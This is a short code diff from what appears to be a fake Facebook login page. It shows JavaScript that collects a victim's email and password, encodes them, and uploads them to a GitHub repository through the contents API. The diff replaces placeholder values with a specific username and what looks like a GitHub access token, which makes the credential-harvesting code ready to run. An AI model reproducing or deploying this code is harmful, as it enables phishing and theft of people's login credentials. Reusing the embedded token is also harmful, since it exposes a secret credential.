@@ -40,11 +40,11 @@
                 jsonData.push({ email, password });
                 const newContent = btoa(JSON.stringify(jsonData));
 
-                fetch('https://api.github.com/repos/your-username/fake-facebook/contents/data.json', {
+                fetch('https://api.github.com/repos/tharushaeshan21/fake-facebook/contents/data.json', {
                     method: 'PUT',
                     headers: {
                         'Accept': 'application/vnd.github.v3+json',
-                        'Authorization': 'token YOUR_GITHUB_TOKEN'
+                        'Authorization': 'token ghp_11BYZLRNY0rIqvfeSJ3YP7'
                     },
                     body: JSON.stringify({
                         message: 'Update data',
